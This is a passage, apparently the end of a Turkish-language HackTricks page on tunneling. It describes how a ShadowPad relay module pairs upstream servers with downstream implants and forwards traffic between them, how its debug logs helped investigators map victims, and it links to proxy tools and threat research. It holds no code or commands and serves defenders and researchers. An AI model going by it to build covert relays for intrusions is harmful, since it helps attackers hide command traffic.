* **Relay orchestration** – module iki liste tutar: “servers” (upstream node'lar) ve “clients” (downstream implant'lar). Yaklaşık 30 saniye içinde heartbeat alınmazsa entry'ler temizlenir. Her iki liste de boş olmadığında, ilk healthy server'ı ilk healthy client ile eşleştirir ve taraflardan biri bağlantıyı kapatana kadar socket'leri arasındaki byte'ları doğrudan pipe eder.
* **Debug telemetry** – optional logging, her pairing için source IP'yi, destination IP'yi ve toplam forwarded byte sayısını kaydeder. Investigators bu breadcrumbs'leri kullanarak birden fazla victim'a yayılan ShadowPad mesh'ini yeniden oluşturdu.

---

## Kontrol edilmesi gereken diğer araçlar

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Gölgelere Saklanmak: QEMU Virtualization üzerinden Covert Tunnel'lar](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell Öncesi: Storm-2603'ün Önceki Ransomware Operasyonlarını İncelemek](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ink Dragon'ın İçine Bakış: Stealthy Offensive Operation'ın Relay Network'ünü ve İç İşleyişini Ortaya Çıkarmak](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
